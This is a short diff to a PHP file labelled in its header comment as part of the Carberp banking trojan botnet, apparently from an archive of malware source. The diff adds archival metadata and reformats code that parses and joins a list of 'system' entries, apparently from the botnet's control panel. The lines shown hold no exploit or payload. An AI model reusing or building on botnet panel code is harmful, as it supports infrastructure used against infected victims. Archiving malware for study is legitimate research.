@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 
 $list = array();
 
@@ -15,13 +26,15 @@ if(!empty($delete_sys) || !empty($add_sys)){
 		}
 	}
 
-	if(strpos(implode('|', $flist), preg_replace('~:(.*)$~isU', ':', $add_sys)) === false){		$list[] = explode(':', $add_sys);
+	if(strpos(implode('|', $flist), preg_replace('~:(.*)$~isU', ':', $add_sys)) === false){
+		$list[] = explode(':', $add_sys);
 	}
 
 	$si = '';
 	if(count($list) > 0){
 		foreach($list as $z){
-			if(!empty($z) && is_array($z) && !empty($z[0]) && !empty($z[1])){				$si .= implode(':', $z) . '|';
+			if(!empty($z) && is_array($z) && !empty($z[0]) && !empty($z[1])){
+				$si .= implode(':', $z) . '|';
 			}
 		}
 	}
